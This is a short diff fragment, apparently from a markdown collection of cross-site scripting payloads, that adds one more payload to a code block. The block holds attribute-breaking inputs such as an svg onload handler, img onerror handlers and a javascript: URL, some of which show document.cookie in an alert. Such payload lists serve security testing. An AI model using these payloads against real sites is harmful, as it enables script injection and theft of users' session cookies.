@@ -22,7 +22,7 @@ https://tweetedtimes.com/v/1939
 
 ```css
 "><svg onload=alert(1)>
-
+#"><img src=/ onerror=alert(document.cookie)>
 <img src=1 onerror=alert(1)>
 
 javascript:alert(document.cookie)
